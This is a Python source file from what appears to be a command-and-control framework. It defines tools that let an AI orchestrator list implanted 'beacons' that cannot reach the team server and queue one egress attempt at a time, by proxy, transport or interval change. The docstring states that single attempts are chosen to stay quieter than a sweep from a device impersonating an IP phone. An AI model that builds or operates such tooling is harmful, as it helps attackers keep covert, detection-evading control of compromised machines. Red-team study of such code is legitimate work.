#!/usr/bin/env python3
"""Orchestrator tools for a beacon that cannot get out.

A beacon whose HTTPS, SMB and QUIC legs have all failed sends one
encrypted diagnostic over DNS (see `software/c2/dns_rescue.py`), and the
team server attaches it to that agent's record as `stuck`. These two tools
are the other half: the orchestrator reads the diagnosis and queues **one**
next attempt.

One, not a sweep. The design considered having the server guess a list of
candidate proxies and ports and try them in sequence, and refused it: a
dozen attempts from a device impersonating an IP phone is louder than the
single short query that reported the problem. So `try_egress` takes one
attempt and the model comes back for the next.

These are the first orchestrator tools that read the fleet, so `Context`
carries a C2 client for them. A run built without one simply is not
offered them, which is how every other optional tool in this package
behaves.
"""

from software.agent.llm.provider import ToolSpec
from software.agent.tools import CORE, Entry

# What the model may ask for. An open string would let it write any beacon
# command it liked through a tool whose whole purpose is narrower than
# that; the verbs here are the ones the diagnosis can actually motivate.
ATTEMPT_VERBS = ("proxy", "transport", "interval")


def _stuck_of(agent):
    stuck = agent.get("stuck") if isinstance(agent, dict) else None
    return stuck if isinstance(stuck, dict) else None


def _get_stuck_beacons(ctx):
    async def get_stuck_beacons():
        agents = await ctx.c2.list_agents()
        out = []
        for agent in agents or ():
            stuck = _stuck_of(agent)
            if stuck is None:
                continue
            out.append({
                "beacon_id": agent.get("id") or agent.get("agent_id"),
                "hostname": agent.get("hostname", ""),
                "summary": stuck.get("summary", ""),
                # False means nothing can leave: the resolver did not
                # answer, so a queued attempt will never reach it either.
                "dns_answered": bool(stuck.get("dns_answered")),
                "reported_at": stuck.get("at", ""),
                "legs": {leg: stuck.get(leg) for leg in
                         ("https", "dns", "smb", "quic")},
            })
        return {"stuck": out}

    return get_stuck_beacons


def _try_egress(ctx):
    async def try_egress(beacon_id, attempt):
        if not isinstance(beacon_id, str) or not beacon_id:
            return {"error": "beacon_id is required"}
        if not isinstance(attempt, str) or not attempt.strip():
            return {"error": "attempt is required"}
        verb = attempt.strip().split()[0].lower()
        if verb not in ATTEMPT_VERBS:
            return {"error": "attempt must start with one of %s"
                             % ", ".join(ATTEMPT_VERBS),
                    "got": verb[:40]}
        agent = await ctx.c2.get_agent(beacon_id)
        if not agent:
            return {"error": "no such beacon %r" % beacon_id[:40]}
        if _stuck_of(agent) is None:
            # Changing the transport of a beacon that is working is a way
            # to lose a channel that was fine.
            return {"error": "beacon %r has not reported being stuck; "
                             "read get_stuck_beacons first" % beacon_id[:40]}
        await ctx.c2.queue_task(beacon_id, attempt.strip(), lane="agent")
        return {"queued": attempt.strip(), "beacon_id": beacon_id,
                "note": "one attempt per call; read get_stuck_beacons again "
                        "after the next check-in"}

    return try_egress


def entries():
    return [
        Entry(
            ToolSpec(
                "get_stuck_beacons",
                "List beacons that reported being unable to reach the team "
                "server, with the reason each leg failed. `dns_answered` "
                "false means nothing can leave that host, so a queued "
                "attempt will not arrive either.",
                {"type": "object", "properties": {}}),
            ("orchestrator",), CORE, _get_stuck_beacons,
            requires_c2=True),
        Entry(
            ToolSpec(
                "try_egress",
                "Queue ONE next attempt for a stuck beacon, chosen from its "
                "diagnosis. One per call, deliberately: a sweep of "
                "candidates is far louder than the problem it solves.",
                {"type": "object",
                 "properties": {
                     "beacon_id": {"type": "string",
                                   "description": "the stuck beacon"},
                     "attempt": {"type": "string",
                                 "description": "one attempt, starting with "
                                                "proxy, transport or "
                                                "interval"}},
                 "required": ["beacon_id", "attempt"]}),
            ("orchestrator",), CORE, _try_egress,
            requires_c2=True),
    ]
